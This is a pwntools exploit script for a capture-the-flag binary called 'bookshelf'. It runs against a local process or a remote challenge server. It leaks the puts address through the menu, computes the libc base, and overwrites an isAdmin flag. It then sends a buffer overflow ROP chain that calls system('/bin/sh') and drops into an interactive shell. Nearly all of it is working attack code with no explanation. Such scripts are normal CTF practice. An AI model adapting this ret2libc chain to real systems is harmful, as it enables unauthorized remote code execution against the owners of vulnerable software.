from pwn import *
import os

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = 'amd64'
pty = process.PTY
offset = 56
is_local = False
is_remote = False

elf_local = ELF("/home/kali/CTF/PCTF/bshelf/bookshelf_patched")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf_local.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    #  nc chal.pctf.competitivecyber.club 4444 
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug(cmd='''
	b *adminBook+114
      ''')


puts_leak = 0
#print(p.recvall(timeout=3))
# Get put address
for i in range(0,9):
	print(p.recvuntilS(b">> "))
	p.sendline(b"2")
	print(p.recvuntilS(b"read? >>"))
	if i != 8:
		p.sendline(b"2") # CHoose books
	else:
		p.sendline(b"3") # leak put address
		print(p.recvuntilS(b"glory "))
		puts_leak = p.recv(14)
		print(p.recvuntilS(b">> "))
		p.sendline(b"N")
		break
	print(p.recvuntilS(b">> "))
	p.sendline(b"y")

log.info('Puts leak: {}'.format(puts_leak))
puts_leak = int(puts_leak,16)


puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b"/bin/sh"))

libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
exit_addr = libc_base + exit_offset
pop_rdi_ret = libc_base + 0x000000000002a3e5
ret = libc_base + 0x00000000000f99ab

log.info('libc base: {}'.format(hex(libc_base)))
log.info('system() addr: {}'.format(hex(system_addr)))
log.info('/bin/sh addr: {}'.format(hex(binsh_addr)))
log.info('pop rdi addr: {}'.format(hex(pop_rdi_ret)))

#----------------------------------------------------------------

# Overwrite isAdmin
print(p.recvuntilS(b">>"))
p.sendline(b"1")
print(p.recvuntilS(b">>"))
p.sendline(b"y")
print(p.recvuntilS(b">>"))
p.sendline(b"A"*40)
print(p.recvuntilS(b">>"))

# https://ret2rop.blogspot.com/2018/08/return-to-libc.html
# ROPgadget --binary rop --only "pop|ret"
# Admin bufferoverflow
p.sendline(b"3")
p.recvuntil(b">>")
payload = b""
payload += b"A"*56
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)
p.sendline(payload)

#p.sendline(b"1")
#print(p.recvuntilS(b">> "))
#p.sendline(b"y")
#print(p.recvuntilS(b">> "))
# overflow isAdmin so its not zero
#p.sendline(b"A"*40)
#print(p.recvuntilS(b">> "))
#p.sendline(b"3")
#print(p.recvall(timeout=2.5))
#p.sendline(b"test")
#print(p.recvall(timeout=2.5))



p.interactive()
